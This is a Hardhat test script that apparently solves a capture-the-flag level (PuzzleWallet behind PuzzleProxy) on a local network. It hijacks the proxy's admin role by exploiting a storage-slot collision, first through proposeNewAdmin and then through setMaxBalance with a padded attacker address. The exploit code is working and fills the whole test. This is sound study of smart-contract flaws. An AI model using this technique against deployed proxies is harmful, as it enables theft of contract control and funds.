
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();

        const Level24Implementation = await hre.ethers.getContractFactory("PuzzleWallet");
        const level24Implementation = await Level24Implementation.deploy();
        await level24Implementation.deployed();

        const Level24 = await hre.ethers.getContractFactory("PuzzleProxy");
        const ABI = ["function init(uint256 _maxBalance)" ];
        const iface = new ethers.utils.Interface(ABI);
        const initData = iface.encodeFunctionData("init", [1234]);
        
        // encode a function call here to send as _initData
        const level24 = await Level24.deploy(owner.address, level24Implementation.address, initData);
        await level24.deployed();
        console.log(
          `Level24 deployed at address ${level24.address}`
        )
        console.log(
          `Level24Helper deployed at address ${level24Implementation.address}`
        )
        return {level24, level24Implementation, owner, otherAccount};
    }

    /*
      You'll need to hijack this wallet to become the admin of the proxy.
    */
    describe("Solve", function() {
        it("Should solve level24", async function() {
            const {level24, level24Implementation, owner, otherAccount} = await loadFixture(deployFallback);

            // admin should be owner to start
            let admin = await level24.connect(otherAccount).admin();
            expect(admin).equals(owner.address);
            // pendingAdmin and owner slots collide between proxy and implementation
            // proposeNewAdmin overwrites owner slot
            await level24.connect(otherAccount).proposeNewAdmin(otherAccount.address);

            // we are now the owner so add ourselves to the whitelist
            // add ourselves to the whitelist
            const implementationABI = require("../artifacts/contracts/level24/level24.sol/PuzzleWallet.json")
            const iface = new ethers.utils.Interface(implementationABI.abi);
            const addToWhitelistCallData = iface.encodeFunctionData("addToWhitelist", [otherAccount.address]);
            tx = {to: level24.address,
                  data: addToWhitelistCallData,
                  gasLimit: 3000000}
            await otherAccount.sendTransaction(tx);

            // maxBalance collides with admin slot in proxy
            // pad our address out to uint256 size
            // call setMaxBalance now that we are whitelisted and overwrite admin
            const paddedAddress = "0x000000000000000000000000".concat(ethers.utils.hexlify(otherAccount.address).slice(2,))
            const maxBalanceCallData = iface.encodeFunctionData("setMaxBalance", [paddedAddress]);
            tx = {to: level24.address,
                  data: maxBalanceCallData,
                  gasLimit: 3000000}
            await otherAccount.sendTransaction(tx);
            admin = await level24.connect(otherAccount).admin();
            
            // expect ourselves to be the admin now
            expect(admin).equals(otherAccount.address);
        })
    });
});